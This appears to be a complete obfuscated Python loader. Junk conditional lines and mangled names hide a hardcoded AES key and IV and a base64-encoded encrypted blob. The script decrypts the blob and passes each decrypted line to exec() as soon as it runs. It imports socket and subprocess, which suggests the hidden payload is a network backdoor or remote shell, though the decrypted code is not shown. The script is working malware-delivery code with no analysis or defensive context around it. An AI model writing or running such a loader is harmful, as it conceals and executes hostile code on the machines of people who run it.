if 64 - 64: i11iIiiIii
#!/usr/bin/python
# -*- coding: utf-8 -*-
if 65 - 65: O0 / iIii1I11I1II1 % OoooooooOO - i1IIi
import socket , subprocess , os
import re , random , string , Crypto , binascii , base64
from Crypto . Cipher import AES
from binascii import hexlify , unhexlify
from base64 import b64decode , b64encode
if 73 - 73: II111iiii
if 22 - 22: I1IiiI * Oo0Ooo / OoO0O00 . OoOoOO00 . o0oOOo0O0Ooo / I1ii11iIi11i
def I1IiI ( pld , key , iv ) :
 o0OOO = AES . new ( key , AES . MODE_CFB , iv )
 iIiiiI = o0OOO . decrypt ( pld )
 if 23 - 23: iii1II11ii * i11iII1iiI + iI1Ii11111iIi + ii1II11I1ii1I + oO0o0ooO0 - iiIIIII1i1iI
 return iIiiiI
def o0oO0 ( pld , key , iv ) :
 oo00 = pld
 o00 = b64decode ( oo00 )
 Oo0oO0ooo = I1IiI ( o00 , key , iv )
 o0oOoO00o = Oo0oO0ooo . splitlines ( )
 return o0oOoO00o
i1 = """3IFB0HDOC9G87AJ42VR2W1DXF3GSSSHM"""
oOOoo00O0O = """f9bo9d8u76pi3cfo"""
if 15 - 15: I11iii11IIi
O00o0o0000o0o = str ( """
cVfSrJN9gjAo0F3puhm9z9HB0rwobTxRmHil2d+7XbcHqAbefcT0CjmWyfsjGHpwO3eeGUxDCsP4PnBpH9IPirocDVZyShRV39amoijBO5EgmsRwuMZHjOMJke8ESU048XhSXWap6PHJ1WuKLfXXvUMTNYLNYuSFjnEsKXJzpA6HpAKe2fruOnrALKt60caWYT0drCww39L+X0XAiEUnLxOF54IayK0Yi92BMaH/KQXro/dtERtnzN+dk8jY2y8fgzeAYn2qozhExtOYhIyHhWab
""" )
if 88 - 88: o0ooo / iiIIIII1i1iI / II111iiii * Oo0Ooo - o0oOOo0O0Ooo * I11iii11IIi
if 12 - 12: o0ooo / iIii1I11I1II1 / iI1Ii11111iIi + iii1II11ii / Oo0Ooo - I1ii11iIi11i
def I1 ( xc = O00o0o0000o0o ) :
 iIiiiI = xc
 o0oOoO00o = o0oO0 ( iIiiiI , i1 , oOOoo00O0O )
 if 54 - 54: i11iII1iiI % O0 + I1IiiI - oO0o0ooO0 / iI1Ii11111iIi
 for iIiiI1 in o0oOoO00o :
  OoOooOOOO = re . findall ( '..?' , iIiiI1 )
  i11iiII = "" . join ( OoOooOOOO )
  exec ( i11iiII )
 return
I1 ( ) # dd678faae9ac167bc83abf78e5cb2f3f0688d3a3
